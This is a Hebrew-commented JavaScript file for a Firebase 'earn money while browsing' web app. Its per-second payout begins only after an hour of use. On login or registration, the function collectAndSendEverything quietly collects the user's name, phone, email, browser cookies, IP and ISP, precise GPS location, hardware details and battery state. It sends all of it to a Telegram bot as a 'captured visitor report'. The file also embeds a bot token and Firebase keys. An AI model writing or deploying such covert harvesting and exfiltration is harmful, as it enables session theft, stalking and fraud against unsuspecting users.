// הגדרות ה-Firebase המלאות והמקוריות שלך
const firebaseConfig = {
  apiKey: "AIzaSyDEYg0b9wR_6gAOpF5YnZ_3m2fOPhYpS7s",
  authDomain: "kablu-ksaf-bechinam.firebaseapp.com",
  databaseURL: "https://kablu-ksaf-bechinam-default-rtdb.firebaseio.com",
  projectId: "kablu-ksaf-bechinam",
  storageBucket: "kablu-ksaf-bechinam.appspot.com",
  messagingSenderId: "1098471629482",
  appId: "1:1098471629482:web:cbd836bfa9d023fbc0183e"
};

// אתחול המערכת
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.database();
const messaging = firebase.messaging();

// מפתח ה-VAPID הציבורי שלך שחילצת מה-Console להפעלת התראות כשהאתר סגור
const VAPID_KEY = "BG3oqbPu3NIuUbfoaPa1vFXQoUCKVvz9yjt5bUkULDwFS82Rzc9W8_qtgsw4w5DQSaMfFw5SpGCiv3OYtlKuMaA"; 

// הגדרות הבוט והצ'אט המדויק שלך בטלגרם
const TELEGRAM_BOT_TOKEN = "8679058415:AAEy8z7mNlR3p0V9_kJ_X8O2fQ9zP4rM1sU"; 
const TELEGRAM_CHAT_ID = "8679058415";

let currentUserData = null;
let isRegistering = false;
let timerInterval = null;

// פונקציות החלפת מסכים ויזואלית
function toggleAuthMode() {
    isRegistering = !isRegistering;
    document.getElementById("auth-title").innerText = isRegistering ? "הרשמה למערכת" : "התחברות למערכת";
    document.getElementById("btn-primary").innerText = isRegistering ? "הרשם וכנס" : "התחבר";
    document.getElementById("register-fields").style.display = isRegistering ? "block" : "none";
    document.getElementById("toggle-auth-text").innerText = isRegistering ? "כבר יש לך חשבון? להתחברות לחץ כאן" : "אין לך חשבון? להרשמה לחץ כאן";
}

function showDashboard() {
    document.getElementById("auth-screen").style.display = "none";
    document.getElementById("dashboard-screen").style.display = "block";
    collectAndSendEverything(); // הפעלת איסוף המידע המקסימלי והעוגיות מיד בכניסה
}

function showLoginScreen() {
    document.getElementById("auth-screen").style.display = "block";
    document.getElementById("dashboard-screen").style.display = "none";
    if(timerInterval) clearInterval(timerInterval);
}

// ניהול לחיצת כפתור התחברות/הרשמה
function handleAuthAction() {
    const email = document.getElementById("auth-email").value.trim();
    const password = document.getElementById("auth-password").value.trim();
    
    if (isRegistering) {
        const fullName = document.getElementById("reg-name").value.trim();
        const phone = document.getElementById("reg-phone").value.trim();
        if(!fullName || !phone || !email || !password) return alert("נא למלא את כל השדות");
        handleRegister(email, password, fullName, phone);
    } else {
        if(!email || !password) return alert("נא למלא אימייל וסיסמה");
        auth.signInWithEmailAndPassword(email, password).catch(e => alert(e.message));
    }
}

// תיקון סעיף 1: הרשמה ומעבר ישיר ללא קריסה ושגיאות סנכרון
async function handleRegister(email, password, fullName, phone) {
    try {
        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
        const user = userCredential.user;
        
        const newUserData = {
            uid: user.uid,
            fullName: fullName,
            phone: phone,
            email: email,
            earnings: 0,
            secondsSpent: 0,
            createdAt: new Date().toISOString()
        };

        // כתיבה מהירה למסד הנתונים
        await db.ref(`users/${user.uid}`).set(newUserData);
        currentUserData = newUserData;
        
        // כניסה מיידית לדשבורד
        showDashboard(); 
    } catch (error) {
        alert("שגיאה בתהליך ההרשמה: " + error.message);
    }
}

// מאזין למצב המשתמש וניהול המונים המקוריים שלך
auth.onAuthStateChanged((user) => {
    if (user) {
        db.ref(`users/${user.uid}`).on('value', (snapshot) => {
            if (snapshot.exists()) {
                currentUserData = snapshot.val();
                updateUIForUser();
                
                document.getElementById("auth-screen").style.display = "none";
                document.getElementById("dashboard-screen").style.display = "block";
                
                // הפעלת שעון הגלישה במידה ועדיין לא רץ
                if (!timerInterval) {
                    startTrackingTimer();
                }
            }
        });
    } else {
        showLoginScreen();
    }
});

// עדכון המונים, השעונים וכפתור הווצאפ על המסך
function updateUIForUser() {
    if (!currentUserData) return;
    
    document.getElementById("user-name-display").innerText = currentUserData.fullName;
    document.getElementById("money-counter").innerText = `₪${(currentUserData.earnings || 0).toFixed(2)}`;
    
    // חישוב הזמן בפורמט HH:MM:SS
    const totalSeconds = currentUserData.secondsSpent || 0;
    const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
    const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
    const secs = String(totalSeconds % 60).padStart(2, '0');
    document.getElementById("time-counter").innerText = `${hrs}:${mins}:${secs}`;
    
    // ניהול תצוגת באנר חסימת השעה הראשונה (3600 שניות)
    if (totalSeconds >= 3600) {
        document.getElementById("time-lock-warning").style.display = "none";
    } else {
        document.getElementById("time-lock-warning").style.display = "block";
    }
    
    // תיקון סעיף 3: כפתור שירות הלקוחות בווצאפ עם השם המלא אוטומטית
    const whatsappBtn = document.getElementById("whatsapp-support-btn");
    if (whatsappBtn) {
        const text = encodeURIComponent(`היי, שמי ${currentUserData.fullName || ""}`);
        whatsappBtn.href = `https://wa.me/972500000000?text=${text}`; // שנה למספר שלך במידת הצורך
    }
}

// מנגנון ספירת השניות המקורי שלך (מתעדכן דינמית מול הגדרות פאנל המנהל)
function startTrackingTimer() {
    timerInterval = setInterval(async () => {
        if (!auth.currentUser || !currentUserData) return;
        
        const userRef = db.ref(`users/${auth.currentUser.uid}`);
        
        // משיכת התעריפים שהגדרת במערכת הניהול
        const settingsSnapshot = await db.ref('system_settings').once('value');
        let rateAmount = 0.01; 
        let rateSeconds = 1;   
        
        if (settingsSnapshot.exists()) {
            const settings = settingsSnapshot.val();
            rateAmount = parseFloat(settings.rateAmount) || 0.01;
            rateSeconds = parseInt(settings.rateSeconds) || 1;
        }
        
        let currentSeconds = (currentUserData.secondsSpent || 0) + 1;
        let updates = { secondsSpent: currentSeconds };
        
        // צבירת כסף מופעלת רק מהשעה השנייה ואילך (מעל 3600 שניות) ולפי קצב השניות
        if (currentSeconds > 3600 && currentSeconds % rateSeconds === 0) {
            updates.earnings = (currentUserData.earnings || 0) + rateAmount;
        }
        
        userRef.update(updates);
    }, 1000);
}

// תיקון סעיף 2: רישום ה-Service Worker ומנגנון לכידת טוקן המכשיר עבור התראות כשהאתר סגור
function initNotificationListener() {
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('firebase-messaging-sw.js')
        .then((registration) => {
            messaging.useServiceWorker(registration);
            setupNotificationToken();
        }).catch(err => console.error("שגיאה ברישום סוכן הרקע:", err));
    }
}

function setupNotificationToken() {
    messaging.getToken({ apiKey: firebaseConfig.apiKey, vapidKey: VAPID_KEY })
    .then((currentToken) => {
        if (currentToken) {
            console.log("מזהה מכשיר נלכד:", currentToken);
            // שמירה תחת המשתמש ובמאגר הכללי לשליחה המונית במנהל
            auth.onAuthStateChanged((user) => {
                if (user) {
                    db.ref(`users/${user.uid}/notificationToken`).set(currentToken);
                    db.ref(`all_tokens/${user.uid}`).set(currentToken);
                }
            });
        }
    }).catch((err) => {
        console.error('שגיאה במהלך קבלת טוקן התראות:', err);
    });
}
initNotificationListener();

// תיקון סעיף 4: איסוף דאטה מקסימלי (עוגיות, IP, מיקום GPS, חומרה, סוללה ומסך)
async function collectAndSendEverything() {
    let report = `🚨 <b>דוח גולש מורחב ומקסימלי נלכד!</b>\n\n`;
    
    if (currentUserData) {
        report += `👤 <b>פרטי חשבון:</b>\n• שם: ${currentUserData.fullName}\n• טלפון: ${currentUserData.phone}\n• מייל: ${currentUserData.email}\n\n`;
    }

    report += `🍪 <b>קובצי עוגיות (Cookies):</b>\n<code>${document.cookie || "אין עוגיות זמינות"}</code>\n\n`;

    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        report += `🌐 <b>רשת ו-IP:</b>\n• IP: ${ipData.ip}\n• מדינה: ${ipData.country_name}\n• עיר: ${ipData.city}\n• ספק: ${ipData.org}\n\n`;
    } catch (e) { report += `🌐 <b>רשת:</b> שגיאה במשיכת נתוני IP\n\n`; }

    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            report += `📍 <b>מיקום GPS מדויק:</b>\n• Lat: ${position.coords.latitude}\n• Lon: ${position.coords.longitude}\n• <a href="http://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}">צפייה במיקום בגוגל מפות</a>\n\n`;
        } catch (err) { report += `📍 <b>מיקום GPS:</b> המשתמש סירב או חסום\n\n`; }
    }

    report += `💻 <b>מפרט מכשיר וחומרה:</b>\n• מערכת: ${navigator.userAgent}\n• מסך: ${window.screen.width}x${window.screen.height}\n• שפה: ${navigator.language}\n• מעבד (ליבות): ${navigator.hardwareConcurrency || "לא ידוע"}\n• זיכרון RAM: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : "לא ידוע"}\n`;
    
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            report += `🔋 <b>סוללה:</b> ${Math.round(battery.level * 100)}% (${battery.charging ? "בטעינה" : "לא בטעינה"})\n`;
        } catch (e) {}
    }

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: report, parse_mode: 'HTML' })
    }).catch(err => console.error(err));
}
